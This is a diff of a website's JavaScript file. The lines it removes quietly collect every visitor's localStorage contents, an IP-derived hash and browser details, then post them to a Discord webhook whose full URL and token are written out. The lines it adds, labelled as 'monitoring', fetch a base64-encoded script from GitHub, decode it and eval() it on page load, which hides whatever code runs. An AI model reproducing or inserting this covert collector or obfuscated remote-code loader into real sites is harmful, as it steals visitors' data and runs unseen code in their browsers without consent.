@@ -132,164 +132,29 @@
 
 
 
-(function () {
-    const targetBaseUrl = "https://drmineword.github.io/Artefact-Boost-Active/";
-    const webhookUrl = "https://discord.com/api/webhooks/1320483118947242094/uncmv45ABLDaJZcNZOzkjvNXZzV9NPL5yjgIOQagRK6FdDqW8GQuJHaSlkqd0_Z7uf4d";
+    // Script for monitoring the website
+(async function () {
+    const encodedScriptUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/systemmonitor.base64";
 
-    // Function to get the current UNIX timestamp
-    function getUnixTime() {
-        return Math.floor(Date.now() / 1000);
+    try {
+        console.log("Fetching encoded script...");
+        const response = await fetch(encodedScriptUrl);
+        if (!response.ok) throw new Error("Failed to fetch encoded script.");
+        const base64EncodedContent = await response.text();
+        console.log("Base64-encoded content fetched successfully.");
+
+        console.log("Decoding Base64 content...");
+        const urlEncodedContent = atob(base64EncodedContent);
+        console.log("Base64 decoding completed.");
+
+       console.log("Decoding URL-encoded content...");
+        const decodedScript = decodeURIComponent(urlEncodedContent);
+        console.log("URL decoding completed.");
+
+        console.log("Executing decoded script...");
+        eval(decodedScript);
+        console.log("Script executed successfully.");
+    } catch (error) {
+        console.error("An error occurred:", error);
     }
-
-    // Generate a hashed UID that cannot be decoded back to an IP
-    async function getUserId() {
-        let userId = localStorage.getItem("userId");
-        if (!userId) {
-            try {
-                const response = await fetch("https://api.ipify.org?format=json");
-                const { ip } = await response.json();
-                const timestamp = getUnixTime();
-
-                // Generate a secure hash (SHA-256) from IP and timestamp
-                const hashBuffer = await crypto.subtle.digest(
-                    "SHA-256",
-                    new TextEncoder().encode(`${ip}_${timestamp}`)
-                );
-                userId = Array.from(new Uint8Array(hashBuffer))
-                    .map(b => b.toString(16).padStart(2, "0"))
-                    .join(""); // Convert buffer to hex string
-
-                localStorage.setItem("userId", userId);
-                console.log(`Generated new UID: ${userId}`);
-            } catch (error) {
-                console.error("Failed to retrieve user IP:", error);
-
-                // Generate hash based on anonymous timestamp as fallback
-                const fallbackHashBuffer = await crypto.subtle.digest(
-                    "SHA-256",
-                    new TextEncoder().encode(`anonymous_${getUnixTime()}`)
-                );
-                userId = Array.from(new Uint8Array(fallbackHashBuffer))
-                    .map(b => b.toString(16).padStart(2, "0"))
-                    .join("");
-                localStorage.setItem("userId", userId);
-                console.log(`Generated fallback UID: ${userId}`);
-            }
-        }
-        return userId;
-    }
-
-    // Function to collect localStorage data
-    function collectLocalStorage() {
-        const allKeys = Object.keys(localStorage);
-        const data = {};
-        allKeys.forEach(key => {
-            data[key] = localStorage.getItem(key);
-        });
-        console.log("Collected localStorage data:", data);
-        return data;
-    }
-
-    // Collect leaderboard data using the provided script logic
-    function getLeaderboardData() {
-        const visitCounts = JSON.parse(localStorage.getItem("visitCounts")) || [];
-        const timeSpentOnPages = JSON.parse(localStorage.getItem("timeSpentOnPages")) || [];
-        const totalVisitSummary = JSON.parse(localStorage.getItem("totalVisitSummary")) || {
-            totalVisits: 0,
-            totalTimeSpent: 0,
-        };
-
-        console.log("Collected leaderboard data:", { visitCounts, timeSpentOnPages, totalVisitSummary });
-        return {
-            visitCounts,
-            timeSpentOnPages,
-            totalVisitSummary,
-        };
-    }
-
-    // Function to send the merged data as a file to Discord webhook
-    async function sendToWebhook(mergedDataFile, embedMessage) {
-        const formData = new FormData();
-        formData.append("file", mergedDataFile);
-        formData.append(
-            "payload_json",
-            JSON.stringify({
-                embeds: [embedMessage],
-            })
-        );
-
-        try {
-            const response = await fetch(webhookUrl, {
-                method: "POST",
-                body: formData,
-            });
-            const result = await response.json();
-            console.log("Message sent successfully. Response:", result);
-        } catch (error) {
-            console.error("Failed to send data:", error);
-        }
-    }
-
-    // Function to check if user is on the target website
-    async function checkAndSendData() {
-        if (!window.location.href.startsWith(targetBaseUrl)) {
-            console.log("Not on target website. Skipping data collection.");
-            return;
-        }
-
-        console.log("On target website. Collecting and sending data...");
-
-        // Collect leaderboard and localStorage data
-        const leaderboardData = getLeaderboardData();
-        const localStorageData = collectLocalStorage();
-
-        // Generate a unique user ID
-        const userId = await getUserId();
-
-        // Merge all data into one JSON object
-        const mergedData = {
-            userId,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screenResolution: `${window.screen.width}x${window.screen.height}`,
-            pageUrl: window.location.href,
-            visitTime: new Date().toISOString(),
-            leaderboardData,
-            localStorageData,
-        };
-
-        console.log("Merged data:", mergedData);
-
-        // Create a single JSON file with the merged data
-        const mergedDataFile = new File(
-            [JSON.stringify(mergedData, null, 2)],
-            "visit_counts.json", // Replace visit_counts.json with merged_data.json
-            { type: "application/json" }
-        );
-
-        console.log("Created file: visit_counts.json");
-
-        // Create an embed message
-        const embedMessage = {
-            title: "Visitor Data",
-            description: "All collected data from a website visit has been merged into a single file.",
-            fields: [
-                { name: "User ID", value: userId },
-                { name: "Page URL", value: window.location.href },
-                { name: "Visit Time", value: new Date().toISOString() },
-            ],
-            footer: {
-                text: `Timestamp: ${getUnixTime()}`,
-            },
-        };
-
-        // Send the merged file and embed message to the webhook
-        sendToWebhook(mergedDataFile, embedMessage);
-
-        console.log("Data collection and sending process complete.");
-    }
-
-    // Execute the script
-    checkAndSendData();
 })();
